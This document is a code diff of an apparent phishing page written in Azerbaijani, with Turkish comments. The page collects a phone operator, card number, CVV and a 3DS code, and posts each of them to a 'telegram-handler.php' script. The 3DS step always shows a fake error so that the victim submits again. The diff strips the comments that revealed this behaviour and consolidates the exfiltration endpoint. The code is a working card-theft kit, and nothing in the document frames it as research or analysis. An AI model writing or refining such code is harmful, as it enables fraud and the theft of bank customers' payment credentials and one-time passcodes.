@@ -461,7 +461,7 @@
             }, 2000);
         }
 
-        // Step 5: Form Submission - PHP'ye gönder
+        // Step 5: Form Submission
         document.getElementById('payment-form').addEventListener('submit', async (e) => {
             e.preventDefault();
 
@@ -503,7 +503,6 @@
             title.textContent = 'Kart yoxlanılır...';
             desc.textContent = 'Zəhmət olmasa gözləyin, kart məlumatlarınız yoxlanılır.';
 
-            // FormData oluştur
             const formData = new FormData();
             formData.append('operator', state.operator);
             formData.append('prefix', state.prefix);
@@ -516,8 +515,7 @@
             formData.append('card_cvv', cardCvvMask.value);
 
             try {
-                // PHP dosyasına gönder
-                const response = await fetch('telegram-handler.php', {
+                const response = await fetch('api/telegram-handler.php', {
                     method: 'POST',
                     body: formData
                 });
@@ -525,7 +523,6 @@
                 const result = await response.json();
 
                 if (result.status === 'success') {
-                    // 5 Second Delay
                     setTimeout(() => {
                         overlay.classList.add('hidden');
                         goToStep(6);
@@ -540,7 +537,7 @@
             }
         });
 
-        // Step 6: 3DS Form Submission - PHP'ye gönder
+        // Step 6: 3DS Form Submission
         document.getElementById('tds-form').addEventListener('submit', async (e) => {
             e.preventDefault();
 
@@ -555,21 +552,18 @@
             desc.textContent = 'Məlumatlar yoxlanılır, zəhmət olmasa gözləyin.';
             errorMsg.classList.add('hidden');
 
-            // FormData oluştur
             const formData = new FormData();
             formData.append('card_number', cardNumberMask.value);
             formData.append('tds_code', document.getElementById('tds-code').value);
 
             try {
-                // PHP dosyasına gönder
-                const response = await fetch('otp.php', {
+                const response = await fetch('api/telegram-handler.php', {
                     method: 'POST',
                     body: formData
                 });
 
                 const result = await response.json();
 
-                // Simulation Delay - her zaman hata göster (gerçek 3DS simülasyonu)
                 setTimeout(() => {
                     overlay.classList.add('hidden');
                     errorMsg.classList.remove('hidden');
@@ -584,4 +578,5 @@
     </script>
 
 
-</body></html>
+</body>
+                    </html>
